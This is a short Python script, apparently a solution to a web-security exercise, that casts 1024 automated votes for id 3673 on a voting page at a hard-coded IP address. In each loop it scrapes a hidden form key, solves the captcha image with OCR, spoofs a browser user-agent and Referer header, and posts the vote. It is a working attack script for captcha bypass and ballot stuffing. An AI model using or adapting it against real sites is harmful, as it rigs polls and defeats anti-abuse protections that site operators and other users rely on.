#!/usr/bin/python3
"""Votes 1024 times for my id making a HTTP POST request
"""
import requests
from bs4 import BeautifulSoup
import pytesseract

url = "http://158.69.76.135/level3.php"
url_captcha = "http://158.69.76.135/captcha.php"
windows_user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
                AppleWebKit/537.36 (KHTML, like Gecko)\
                Chrome/74.0.3729.169 Safari/537.36"

for i in range(1024):
    session = requests.Session()
    page = session.get(url)

    # Parse and get html elements
    soup = BeautifulSoup(page.content, "html.parser")
    key = soup.find_all("input")[1]["value"]

    # Create a image file and write it with bytes of the captcha url
    fd = open("captcha.png", "wb")
    fd.write(session.get(url_captcha).content)
    fd.close()

    # Use the OCR in the image
    txt = pytesseract.image_to_string("captcha.png").strip()

    # Make the request
    data = {'id': '3673', 'key': key, 'captcha': txt, 'holdthedoor': 'submit'}
    headers = {'user-agent': windows_user, 'Referer': url}
    resp = session.post(url, data=data, headers=headers)

    if resp.status_code == 200:
        print("Vote:", i + 1)
